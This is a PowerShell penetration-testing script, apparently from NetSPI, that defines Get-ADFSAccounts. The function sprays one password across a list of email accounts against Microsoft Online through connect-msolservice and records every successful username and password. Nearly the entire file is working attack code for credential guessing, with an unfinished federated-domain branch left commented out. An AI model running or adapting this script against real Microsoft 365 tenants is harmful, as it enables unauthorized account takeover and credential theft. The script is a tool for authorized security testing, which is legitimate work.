#requires -Modules MSOnline

<#
	    .SYNOPSIS
	       This script can be used to attempt user logins against federated/managed domains using Microsoft's APIs.

	    .DESCRIPTION
	       This script can be used to attempt authentication against authentication points for federated domains. Credentials are sent to Microsoft using the connect-msolservice PowerShell module. Successful usernames/passwords are then returned as a datatable.

	    .EXAMPLE
	       
	       PS C:\> Get-ADFSAccounts -email test@test.com -password "Password123" -type "Managed" | ft -AutoSize

			Email              Password      
			-----              ----          
			test@microsoft.com Password123 

	       
	    .EXAMPLE
	       
	       PS C:\> Get-ADFSAccounts -list "C:\Temp\emails.txt" -password "Password123" -type "Managed"  | ft -AutoSize

			Email                Password      
			-----                ----          
			test@microsoft.com   Password123
			test39@microsoft.com Password123 

	     .NOTES
	       Author: Ryan Gandrud (@siegenapster), NetSPI - 2017
           Contributors: Scott Sutherland (@_nullbind), Karl Fosaaen (@kfosaaen)
	       	       
	     .LINK
	       https://blog.netspi.com/using-powershell-identify-federated-domains/
		   http://www.economyofmechanism.com/office365-authbypass.html
		   https://blogs.msdn.microsoft.com/besidethepoint/2012/10/17/request-adfs-security-token-with-powershell/
		   https://msdn.microsoft.com/en-us/library/jj151815.aspx
		   https://technet.microsoft.com/en-us/library/dn568015.aspx
#>

function Get-ADFSAccounts{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Email address to test password against ADFS endpoint.")]
        [string]$email,

        [Parameter(Mandatory=$true,
        HelpMessage="Full path to email address list to get the ADFS endpoint for.")]
        [string]$password,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Type of Microsoft service targeted: Managed or Federated")]
        [string]$type,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain of users if targeting Federated ADFS endpoint")]
        [string]$domain,
		
		[Parameter(Mandatory=$false,
        HelpMessage="Location of list of usernames/emails to test. E.g. C:\temp\emails.txt")]
        [string]$list
    )

	if($list){
		$Users = Get-Content $list
    }
	elseif($email) {
		$Users = $email
	}
	
    # Create data table to house results
    $EmailTestResults = new-object system.data.datatable
    $EmailTestResults.columns.add("Email") | Out-Null
    $EmailTestResults.columns.add("Domain") | Out-Null
    $EmailTestResults.columns.add("Password") | Out-Null
    

    
    if ($type -eq "Managed" ) {
        
		$Users | ForEach-Object {
		
			Write-Output "Testing $_"
		
			try{
				# Make all errors terminating to get try/catch to work.
				$ErrorActionPreference = "Stop";
			
				# Set up new PSSession
				$s = New-PSSession -Name test
			
				# Set up credentials and connect to Azure cloud in PSSession
				Invoke-Command -Session $s -ScriptBlock {$User = "$($args[0])";$PWord = ConvertTo-SecureString -String "$($args[1])" -AsPlainText -Force;$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord;connect-msolservice -credential $Credential} -ArgumentList $_,$password
				
				# Try accessing user information to confirm connection set up
				# If successful, record email and password in table
				if(Invoke-Command -Session $s -ScriptBlock {Get-MsolUser -UserPrincipalName $User}) {
					$EmailTestResults.Rows.Add($_, "N/A", $password) | Out-Null
				}
			
				# Kill and remove PSSession
				Remove-PSSession -Session $s
			}

			catch{
				# Make sure to remove PSSession
				Remove-PSSession -Session $s
				Write-Host "Invalid credentials for $email"
			}
		}
    }
	
    ElseIf($type -eq "Federated") {

        Write-Host "`nFederated authentication is not yet supported."
		
		# Not working yet. Need to pull in ConnectionUri from Karl's Get-FederationEndpoint script
		#if(Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credential -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name}) {
		#	$EmailTestResults.Rows.Add($User, $domain, $PWord) | Out-Null
        #}
		

    }

    Else{
        Write-Host "`nType parameter not recognized. 'Managed' and 'Federated' are the options."
        Write-Host "If you are unsure which value to go with, check out https://blog.netspi.com/using-powershell-identify-federated-domains/`n"
    }


    Return $EmailTestResults
}
